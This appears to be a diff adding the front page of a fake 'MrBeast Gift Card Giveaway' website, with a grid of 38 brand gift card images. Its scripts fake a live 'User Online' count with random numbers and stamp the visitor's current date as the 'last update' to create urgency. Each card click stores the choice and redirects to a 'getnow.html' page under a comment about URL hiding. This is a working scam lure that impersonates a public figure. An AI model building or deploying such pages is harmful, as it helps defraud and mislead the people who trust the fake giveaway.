@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MrBeast Gift Card</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Permanent+Marker&family=Poppins:wght@700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --mrbeast-blue: #00AEEF; --mrbeast-red: #FF0000; }
+        
+        body { 
+            margin: 0; 
+            font-family: 'Poppins', sans-serif; 
+            color: #111; 
+            text-align: center; 
+            min-height: 100vh; 
+            overflow-x: hidden;
+            background-color: #00AEEF;
+        }
+
+        /* --- BACKGROUND LAYER --- */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0; 
+            background-color: #00AEEF;
+            background-image: url('./imagesss/wbbg.png');
+            background-size: cover; 
+            background-position: 0 center;
+            background-repeat: repeat-x; 
+            z-index: -1; 
+            animation: slideDesktop 10000s linear infinite; 
+        }
+
+        @keyframes slideDesktop {
+            0% { background-position: 0px center; }
+            100% { background-position: -2000000px center; } 
+        }
+
+        .language-switcher { position: absolute; top: 15px; right: 15px; z-index: 9999; }
+        
+        .mrbeast-hero { position: relative; padding: 15px 0 0; margin-bottom: 0px; z-index: 2; }
+        
+        .mrbeast-logo-top { width: 100px; margin-bottom: 0px; position: relative; z-index: 2; }
+        
+        /* --- TEXT STYLES (FIXED OVERLAPPING) --- */
+        .mrbeast-text-group { display: flex; flex-direction: column; align-items: center; }
+
+        .mrbeast-text-group h1 { 
+            font-family: 'Permanent Marker', cursive; 
+            font-size: 3.3rem; 
+            font-weight: 400; 
+            color: #000; 
+            margin: 0 0 8px 0; /* THODA GAP ADD KIYA HAI NEECHE */
+            line-height: 1.1; 
+        }
+        
+        .mrbeast-text-group p { 
+            font-family: 'Luckiest Guy', cursive; 
+            font-size: 2.1rem; 
+            font-weight: 400;
+            color: #000; 
+            margin: 0; /* NEGATIVE MARGIN (-4PX) HATA DIYA */
+            letter-spacing: 2px;
+            line-height: 1.1;
+        }
+        
+        .user-info { 
+            font-family: 'Poppins', sans-serif;
+            font-size: 1rem; 
+            font-weight: 900; 
+            color: #111; 
+            margin: 5px 0 5px 0; 
+            white-space: nowrap; 
+        }
+        .user-info strong, .user-info #currentDate { color: var(--mrbeast-red); font-weight: 900; }
+        
+        /* --- CARDS LAYOUT --- */
+        .cards { 
+            display: grid; 
+            grid-template-columns: repeat(14, 1fr); 
+            justify-content: center; 
+            gap: 10px; 
+            padding: 10px 20px 20px 20px; 
+            max-width: 2000px; 
+            margin: auto; 
+            position: relative; 
+            z-index: 1; 
+        }
+        
+        .card { background: white; border-radius: 12px; box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2); overflow: hidden; border: 1px solid #ddd; transition: 0.3s; cursor: pointer; }
+        .card img { width: 100%; height: auto; display: block; object-fit: contain; }
+        .card:hover { transform: translateY(-5px) scale(1.05); }
+
+        /* --- 1440px to 1920px SCREENS --- */
+        @media (max-width: 1920px) {
+            .cards { grid-template-columns: repeat(8, 1fr); gap: 12px; max-width: 1220px; padding: 5px 20px 20px 20px; }
+        }
+
+        /* --- MEDIUM DESKTOP --- */
+        @media (max-width: 1300px) {
+            .cards { grid-template-columns: repeat(6, 1fr); max-width: 1000px; }
+        }
+
+        /* --- LAPTOP BREAKPOINT --- */
+        @media (max-width: 1050px) {
+            .cards { grid-template-columns: repeat(5, 1fr); gap: 16px; max-width: 860px; }
+            .mrbeast-text-group h1 { font-size: 2.8rem; }
+            .mrbeast-text-group p { font-size: 1.8rem; }
+        }
+
+        /* --- TABLET BREAKPOINT --- */
+        @media (max-width: 850px) {
+            .cards { grid-template-columns: repeat(4, minmax(0, 142px)); max-width: 100%; gap: 14px; }
+        }
+
+        /* --- SMALL TABLET --- */
+        @media (max-width: 650px) {
+            .cards { grid-template-columns: repeat(3, minmax(0, 142px)); gap: 12px; }
+            .mrbeast-text-group h1 { font-size: 2.5rem; }
+            .mrbeast-text-group p { font-size: 1.6rem; }
+        }
+
+        /* --- REGULAR MOBILE PHONES --- */
+        @media (max-width: 480px) { 
+            .language-switcher { top: 10px; right: 10px; transform: scale(0.85); transform-origin: top right; }
+            .mrbeast-hero { padding-top: 45px; margin-bottom: 5px; } 
+
+            .mrbeast-logo-top { width: 90px; } 
+            
+            /* FIXED OVERLAP FOR MOBILE */
+            .mrbeast-text-group h1 { font-size: 2.5rem; line-height: 1.1; margin-bottom: 5px; } 
+            .mrbeast-text-group p { font-size: 1.6rem; letter-spacing: 1px; } 
+            
+            .user-info { font-size: 0.85rem; margin: 5px 0 10px 0; white-space: normal; line-height: 1.4; padding: 0 5px; }
+
+            .cards { grid-template-columns: repeat(2, minmax(0, 142px)); gap: 15px; padding: 10px; } 
+        }
+
+        /* --- EXTRA SMALL MOBILE --- */
+        @media (max-width: 360px) {
+            .language-switcher { transform: scale(0.7); right: 5px; top: 8px; }
+            .mrbeast-hero { padding-top: 50px; }
+            .mrbeast-logo-top { width: 85px; } 
+            
+            /* FIXED OVERLAP FOR SMALL MOBILE */
+            .mrbeast-text-group h1 { font-size: 2.2rem; margin-bottom: 5px; } 
+            .mrbeast-text-group p { font-size: 1.4rem; } 
+            
+            .user-info { font-size: 0.75rem; margin: 5px 0 10px 0; white-space: normal; line-height: 1.4; padding: 0 5px; }
+            
+            .cards { grid-template-columns: repeat(2, minmax(0, 125px)); gap: 12px; padding: 10px; }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="language-switcher"><div class="gtranslate_wrapper"></div></div>
+    
+    <div class="mrbeast-hero">
+        <img src="./imagesss/mrbeastlogo.png" class="mrbeast-logo-top">
+        <div class="mrbeast-text-group">
+            <h1>MR BEAST</h1>
+            <p>GIFT CARD GIVEAWAY</p>
+        </div>
+        <div class="user-info">User Online: <strong id="onlineUsers">273</strong> | Last update: <strong id="currentDate">Mar 18 2026</strong></div>
+    </div>
+    
+    <section class="cards">
+        <!-- ALL 38 CARDS UPDATED WITH NEW ONCLICK -->
+        <div class="card" onclick="openCard('./imagesss/amazon.png')"><img src="./imagesss/amazon.png"></div>
+        <div class="card" onclick="openCard('./imagesss/steamm.png')"><img src="./imagesss/steamm.png"></div>
+        <div class="card" onclick="openCard('./imagesss/google play.png')"><img src="./imagesss/google play.png"></div>
+        <div class="card" onclick="openCard('./imagesss/apple music.png')"><img src="./imagesss/apple music.png"></div>
+        <div class="card" onclick="openCard('./imagesss/minecraft.png')"><img src="./imagesss/minecraft.png"></div>
+        <div class="card" onclick="openCard('./imagesss/Pubg.png')"><img src="./imagesss/Pubg.png"></div>
+        <div class="card" onclick="openCard('./imagesss/playstation.png')"><img src="./imagesss/playstation.png"></div>
+        <div class="card" onclick="openCard('./imagesss/Fortnite.png')"><img src="./imagesss/Fortnite.png"></div>
+        <div class="card" onclick="openCard('./imagesss/xbox.png')"><img src="./imagesss/xbox.png"></div>
+        <div class="card" onclick="openCard('./imagesss/itunes.png')"><img src="./imagesss/itunes.png"></div>
+        <div class="card" onclick="openCard('./imagesss/roblox.png')"><img src="./imagesss/roblox.png"></div>
+        <div class="card" onclick="openCard('./imagesss/gold.png')"><img src="./imagesss/gold.png"></div>
+        <div class="card" onclick="openCard('./imagesss/playstation2.png')"><img src="./imagesss/playstation2.png"></div>
+        <div class="card" onclick="openCard('./imagesss/wow.png')"><img src="./imagesss/wow.png"></div>
+        <div class="card" onclick="openCard('./imagesss/riot.png')"><img src="./imagesss/riot.png"></div>
+        <div class="card" onclick="openCard('./imagesss/karma koin.png')"><img src="./imagesss/karma koin.png"></div>
+        <div class="card" onclick="openCard('./imagesss/Nintendo.png')"><img src="./imagesss/Nintendo.png"></div>
+        <div class="card" onclick="openCard('./imagesss/Webkinz.png')"><img src="./imagesss/Webkinz.png"></div>
+        <div class="card" onclick="openCard('./imagesss/imvu.png')"><img src="./imagesss/imvu.png"></div>
+        <div class="card" onclick="openCard('./imagesss/playstation now.png')"><img src="./imagesss/playstation now.png"></div>
+        <div class="card" onclick="openCard('./imagesss/xBOX 12M.png')"><img src="./imagesss/xBOX 12M.png"></div>
+        <div class="card" onclick="openCard('./imagesss/xbox 14m.png')"><img src="./imagesss/xbox 14m.png"></div>
+        <div class="card" onclick="openCard('./imagesss/Vudu.png')"><img src="./imagesss/Vudu.png"></div>
+        <div class="card" onclick="openCard('./imagesss/online.png')"><img src="./imagesss/online.png"></div>
+        <div class="card" onclick="openCard('./imagesss/fortnite 13500.png')"><img src="./imagesss/fortnite 13500.png"></div>
+        <div class="card" onclick="openCard('./imagesss/home deput.png')"><img src="./imagesss/home deput.png"></div>
+        <div class="card" onclick="openCard('./imagesss/sephora.png')"><img src="./imagesss/sephora.png"></div>
+        <div class="card" onclick="openCard('./imagesss/ebay.png')"><img src="./imagesss/ebay.png"></div>
+        <div class="card" onclick="openCard('./imagesss/crypto voucher.png')"><img src="./imagesss/crypto voucher.png"></div>
+        <div class="card" onclick="openCard('./imagesss/spotifyy.png')"><img src="./imagesss/spotifyy.png"></div>
+        <div class="card" onclick="openCard('./imagesss/netflixx.png')"><img src="./imagesss/netflixx.png"></div>
+        <div class="card" onclick="openCard('./imagesss/facebookk (1).png')"><img src="./imagesss/facebookk (1).png"></div>
+        <div class="card" onclick="openCard('./imagesss/hulu.png')"><img src="./imagesss/hulu.png"></div>
+        <div class="card" onclick="openCard('./imagesss/mlbtv.png')"><img src="./imagesss/mlbtv.png"></div>
+        <div class="card" onclick="openCard('./imagesss/crunchyroll.png')"><img src="./imagesss/crunchyroll.png"></div>
+        <div class="card" onclick="openCard('./imagesss/xbox 6mnt.png')"><img src="./imagesss/xbox 6mnt.png"></div>
+        <div class="card" onclick="openCard('./imagesss/gamepasss.png')"><img src="./imagesss/gamepasss.png"></div>
+        <div class="card" onclick="openCard('./imagesss/skype.png')"><img src="./imagesss/skype.png"></div>
+    </section>
+
+    <!-- NEW SCRIPT FOR URL HIDING -->
+    <script>
+        function openCard(imgSrc) {
+            localStorage.setItem('selectedCard', imgSrc);
+            window.location.href = 'getnow.html';
+        }
+    </script>
+
+    <script>
+        function updateOnlineUsers() {
+            const el = document.getElementById('onlineUsers');
+            if(!el) return;
+            let current = parseInt(el.innerText);
+            let newValue = current + (Math.floor(Math.random() * 11) - 5);
+            if(newValue < 250) newValue = 280; if(newValue > 350) newValue = 310;
+            el.innerText = newValue;
+            
+            const d = new Date();
+            const month = d.toLocaleString('en-US', { month: 'short' });
+            const day = d.getDate();
+            const year = d.getFullYear();
+            const dateEl = document.getElementById('currentDate');
+            if(dateEl) dateEl.innerText = `${month} ${day} ${year}`;
+        }
+        setInterval(updateOnlineUsers, 5000); updateOnlineUsers();
+    </script>
+    <script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"wrapper_selector":".gtranslate_wrapper"}</script>
+    <script src="https://cdn.gtranslate.net/widgets/latest/dropdown.js" defer></script>
+</body>
+</html>
